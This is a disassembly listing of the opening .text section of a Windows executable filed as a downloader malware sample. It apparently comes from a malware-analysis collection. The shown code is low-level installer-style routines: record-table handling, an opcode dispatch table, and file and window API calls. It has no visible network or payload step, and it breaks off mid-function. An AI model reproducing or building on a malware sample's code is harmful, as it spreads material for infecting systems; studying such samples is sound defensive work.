
malware_samples/downloader/2f382fe438b4aee43a80ddc6c230624e537b7b630b9548a4bfbb03dc8dabad34.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 28 37 42 00    	mov    0x423728,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 04 72 40 00    	call   *0x407204
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 30 37 42 00    	mov    0x423730,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 08 72 40 00    	call   *0x407208
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 0c 72 40 00    	call   *0x40720c
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 5c 70 40 00    	mov    0x40705c,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 64 70 40 00    	call   *0x407064
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 10 72 40 00    	call   *0x407210
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 54 70 40 00    	call   *0x407054
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 50 70 40 00    	call   *0x407050
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 58 70 40 00    	call   *0x407058
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 4c 70 40 00    	mov    0x40704c,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 20 2f 42 00       	push   $0x422f20
  401155:	57                   	push   %edi
  401156:	ff 15 14 72 40 00    	call   *0x407214
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 6c 72 40 00    	call   *0x40726c
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 48 37 42 00       	mov    0x423748,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 4c 37 42 00    	cmp    0x42374c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 04 00 00       	add    $0x418,%eax
  4011e1:	3b 35 4c 37 42 00    	cmp    0x42374c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  401201:	8b 1d 48 37 42 00    	mov    0x423748,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 4c 37 42 00    	cmp    0x42374c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 4c 37 42 00    	cmp    0x42374c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 48 37 42 00       	mov    0x423748,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 4c 37 42 00    	cmp    %esi,0x42374c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4012d5:	3b 35 4c 37 42 00    	cmp    0x42374c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 30 37 42 00       	mov    0x423730,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 4c 37 42 00    	mov    0x42374c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 48 37 42 00    	mov    0x423748,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 04 00 00    	add    $0x418,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 40 42 00       	mov    $0x424000,%ecx
  40137b:	c1 e0 0a             	shl    $0xa,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 54 4a 00 00       	call   0x405dda
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 50 37 42 00    	mov    0x423750,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 0c 2f 42 00    	add    %eax,0x422f0c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 f4 2e 42 00    	push   0x422ef4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 0c 2f 42 00    	push   0x422f0c
  4013e4:	ff 15 48 71 40 00    	call   *0x407148
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 00 72 40 00    	call   *0x407200
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 30 37 42 00    	mov    0x423730,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 00 98 40 00       	push   $0x409800
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 4b 3c 00 00       	call   0x40507c
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec a4 01 00 00    	sub    $0x1a4,%esp
  40143d:	a1 28 37 42 00       	mov    0x423728,%eax
  401442:	53                   	push   %ebx
  401443:	56                   	push   %esi
  401444:	8b 75 08             	mov    0x8(%ebp),%esi
  401447:	57                   	push   %edi
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  40144e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401451:	33 db                	xor    %ebx,%ebx
  401453:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401455:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401458:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40145b:	8b f0                	mov    %eax,%esi
  40145d:	8b fa                	mov    %edx,%edi
  40145f:	c1 e6 0a             	shl    $0xa,%esi
  401462:	b9 00 40 42 00       	mov    $0x424000,%ecx
  401467:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40146a:	c1 e7 0a             	shl    $0xa,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401474:	89 0d 00 a8 40 00    	mov    %ecx,0x40a800
  40147a:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40147d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401480:	83 f9 41             	cmp    $0x41,%ecx
  401483:	0f 87 46 14 00 00    	ja     0x4028cf
  401489:	ff 24 8d e1 28 40 00 	jmp    *0x4028e1(,%ecx,4)
  401490:	53                   	push   %ebx
  401491:	50                   	push   %eax
  401492:	e8 e5 3b 00 00       	call   0x40507c
  401497:	e9 d2 0d 00 00       	jmp    0x40226e
  40149c:	ff 05 ec 2e 42 00    	incl   0x422eec
  4014a2:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a5:	0f 84 c3 0d 00 00    	je     0x40226e
  4014ab:	53                   	push   %ebx
  4014ac:	ff 15 c8 71 40 00    	call   *0x4071c8
  4014b2:	e9 b7 0d 00 00       	jmp    0x40226e
  4014b7:	50                   	push   %eax
  4014b8:	e8 b0 fe ff ff       	call   0x40136d
  4014bd:	48                   	dec    %eax
  4014be:	53                   	push   %ebx
  4014bf:	50                   	push   %eax
  4014c0:	e8 c4 fe ff ff       	call   0x401389
  4014c5:	e9 10 14 00 00       	jmp    0x4028da
  4014ca:	53                   	push   %ebx
  4014cb:	50                   	push   %eax
  4014cc:	e8 ab 3b 00 00       	call   0x40507c
  4014d1:	e9 f9 13 00 00       	jmp    0x4028cf
  4014d6:	53                   	push   %ebx
  4014d7:	e8 41 15 00 00       	call   0x402a1d
  4014dc:	83 f8 01             	cmp    $0x1,%eax
  4014df:	7f 03                	jg     0x4014e4
  4014e1:	33 c0                	xor    %eax,%eax
  4014e3:	40                   	inc    %eax
  4014e4:	50                   	push   %eax
  4014e5:	ff 15 74 70 40 00    	call   *0x407074
  4014eb:	e9 df 13 00 00       	jmp    0x4028cf
  4014f0:	ff 75 f8             	push   -0x8(%ebp)
  4014f3:	ff 15 4c 72 40 00    	call   *0x40724c
  4014f9:	e9 d1 13 00 00       	jmp    0x4028cf
  4014fe:	c1 e0 02             	shl    $0x2,%eax
  401501:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401504:	75 22                	jne    0x401528
  401506:	8b 88 a0 37 42 00    	mov    0x4237a0(%eax),%ecx
  40150c:	6a 01                	push   $0x1
  40150e:	89 88 e0 37 42 00    	mov    %ecx,0x4237e0(%eax)
  401514:	e8 04 15 00 00       	call   0x402a1d
  401519:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40151c:	89 04 8d a0 37 42 00 	mov    %eax,0x4237a0(,%ecx,4)
  401523:	e9 a7 13 00 00       	jmp    0x4028cf
  401528:	8b 88 e0 37 42 00    	mov    0x4237e0(%eax),%ecx
  40152e:	89 88 a0 37 42 00    	mov    %ecx,0x4237a0(%eax)
  401534:	e9 96 13 00 00       	jmp    0x4028cf
  401539:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40153c:	8d 34 85 a0 37 42 00 	lea    0x4237a0(,%eax,4),%esi
  401543:	33 c0                	xor    %eax,%eax
  401545:	8b 0e                	mov    (%esi),%ecx
  401547:	3b cb                	cmp    %ebx,%ecx
  401549:	0f 94 c0             	sete   %al
  40154c:	23 4d e4             	and    -0x1c(%ebp),%ecx
  40154f:	8b 44 85 d8          	mov    -0x28(%ebp,%eax,4),%eax
  401553:	89 0e                	mov    %ecx,(%esi)
  401555:	e9 80 13 00 00       	jmp    0x4028da
  40155a:	ff 34 95 a0 37 42 00 	push   0x4237a0(,%edx,4)
  401561:	56                   	push   %esi
  401562:	e9 10 13 00 00       	jmp    0x402877
  401567:	8b 0d f0 2e 42 00    	mov    0x422ef0,%ecx
  40156d:	8b 35 78 72 40 00    	mov    0x407278,%esi
  401573:	3b cb                	cmp    %ebx,%ecx
  401575:	74 07                	je     0x40157e
  401577:	52                   	push   %edx
  401578:	51                   	push   %ecx
  401579:	ff d6                	call   *%esi
  40157b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40157e:	8b 0d 04 2f 42 00    	mov    0x422f04,%ecx
  401584:	3b cb                	cmp    %ebx,%ecx
  401586:	0f 84 43 13 00 00    	je     0x4028cf
  40158c:	50                   	push   %eax
  40158d:	51                   	push   %ecx
  40158e:	ff d6                	call   *%esi
  401590:	e9 3a 13 00 00       	jmp    0x4028cf
  401595:	6a f0                	push   $0xfffffff0
  401597:	e8 9e 14 00 00       	call   0x402a3a
  40159c:	ff 75 dc             	push   -0x24(%ebp)
  40159f:	50                   	push   %eax
  4015a0:	ff 15 90 70 40 00    	call   *0x407090
  4015a6:	85 c0                	test   %eax,%eax
  4015a8:	0f 85 21 13 00 00    	jne    0x4028cf
  4015ae:	e9 f3 10 00 00       	jmp    0x4026a6
  4015b3:	6a f0                	push   $0xfffffff0
  4015b5:	e8 80 14 00 00       	call   0x402a3a
  4015ba:	8b f8                	mov    %eax,%edi
  4015bc:	57                   	push   %edi
  4015bd:	e8 ac 43 00 00       	call   0x40596e
  4015c2:	8b f0                	mov    %eax,%esi
  4015c4:	3b f3                	cmp    %ebx,%esi
  4015c6:	74 54                	je     0x40161c
  4015c8:	6a 5c                	push   $0x5c
  4015ca:	56                   	push   %esi
  4015cb:	e8 30 43 00 00       	call   0x405900
  4015d0:	8b f0                	mov    %eax,%esi
  4015d2:	8a 06                	mov    (%esi),%al
  4015d4:	88 1e                	mov    %bl,(%esi)
  4015d6:	3a c3                	cmp    %bl,%al
  4015d8:	88 45 0b             	mov    %al,0xb(%ebp)
  4015db:	75 16                	jne    0x4015f3
  4015dd:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4015e0:	74 11                	je     0x4015f3
  4015e2:	e8 f5 3f 00 00       	call   0x4055dc
  4015e7:	85 c0                	test   %eax,%eax
  4015e9:	74 08                	je     0x4015f3
  4015eb:	57                   	push   %edi
  4015ec:	e8 51 3f 00 00       	call   0x405542
  4015f1:	eb 06                	jmp    0x4015f9
  4015f3:	57                   	push   %edi
  4015f4:	e8 c6 3f 00 00       	call   0x4055bf
  4015f9:	3b c3                	cmp    %ebx,%eax
  4015fb:	74 15                	je     0x401612
  4015fd:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401602:	75 0b                	jne    0x40160f
  401604:	57                   	push   %edi
  401605:	ff 15 8c 70 40 00    	call   *0x40708c
  40160b:	a8 10                	test   $0x10,%al
  40160d:	75 03                	jne    0x401612
  40160f:	ff 45 fc             	incl   -0x4(%ebp)
  401612:	8a 45 0b             	mov    0xb(%ebp),%al
  401615:	88 06                	mov    %al,(%esi)
  401617:	46                   	inc    %esi
  401618:	3a c3                	cmp    %bl,%al
  40161a:	75 ac                	jne    0x4015c8
  40161c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40161f:	74 29                	je     0x40164a
  401621:	6a e6                	push   $0xffffffe6
  401623:	e8 fb fd ff ff       	call   0x401423
  401628:	57                   	push   %edi
  401629:	68 00 98 42 00       	push   $0x429800
  40162e:	e8 30 48 00 00       	call   0x405e63
  401633:	57                   	push   %edi
  401634:	ff 15 f8 70 40 00    	call   *0x4070f8
  40163a:	85 c0                	test   %eax,%eax
  40163c:	0f 85 8d 12 00 00    	jne    0x4028cf
  401642:	ff 45 fc             	incl   -0x4(%ebp)
  401645:	e9 85 12 00 00       	jmp    0x4028cf
  40164a:	6a f5                	push   $0xfffffff5
  40164c:	e9 73 0b 00 00       	jmp    0x4021c4
  401651:	53                   	push   %ebx
  401652:	e8 e3 13 00 00       	call   0x402a3a
  401657:	50                   	push   %eax
  401658:	e8 0a 4b 00 00       	call   0x406167
  40165d:	e9 35 06 00 00       	jmp    0x401c97
  401662:	6a d0                	push   $0xffffffd0
  401664:	e8 d1 13 00 00       	call   0x402a3a
  401669:	6a df                	push   $0xffffffdf
  40166b:	8b f0                	mov    %eax,%esi
  40166d:	e8 c8 13 00 00       	call   0x402a3a
  401672:	6a 13                	push   $0x13
  401674:	8b f8                	mov    %eax,%edi
  401676:	e8 bf 13 00 00       	call   0x402a3a
  40167b:	57                   	push   %edi
  40167c:	56                   	push   %esi
  40167d:	ff 15 fc 70 40 00    	call   *0x4070fc
  401683:	85 c0                	test   %eax,%eax
  401685:	74 07                	je     0x40168e
  401687:	6a e3                	push   $0xffffffe3
  401689:	e9 36 0b 00 00       	jmp    0x4021c4
  40168e:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401691:	0f 84 0f 10 00 00    	je     0x4026a6
  401697:	56                   	push   %esi
  401698:	e8 ca 4a 00 00       	call   0x406167
  40169d:	85 c0                	test   %eax,%eax
  40169f:	0f 84 01 10 00 00    	je     0x4026a6
  4016a5:	57                   	push   %edi
  4016a6:	56                   	push   %esi
  4016a7:	e8 72 46 00 00       	call   0x405d1e
  4016ac:	6a e4                	push   $0xffffffe4
  4016ae:	e9 11 0b 00 00       	jmp    0x4021c4
  4016b3:	53                   	push   %ebx
  4016b4:	e8 81 13 00 00       	call   0x402a3a
  4016b9:	8b f0                	mov    %eax,%esi
  4016bb:	8d 45 08             	lea    0x8(%ebp),%eax
  4016be:	50                   	push   %eax
  4016bf:	57                   	push   %edi
  4016c0:	68 00 04 00 00       	push   $0x400
  4016c5:	56                   	push   %esi
  4016c6:	ff 15 b4 70 40 00    	call   *0x4070b4
  4016cc:	85 c0                	test   %eax,%eax
  4016ce:	74 23                	je     0x4016f3
  4016d0:	8b 45 08             	mov    0x8(%ebp),%eax
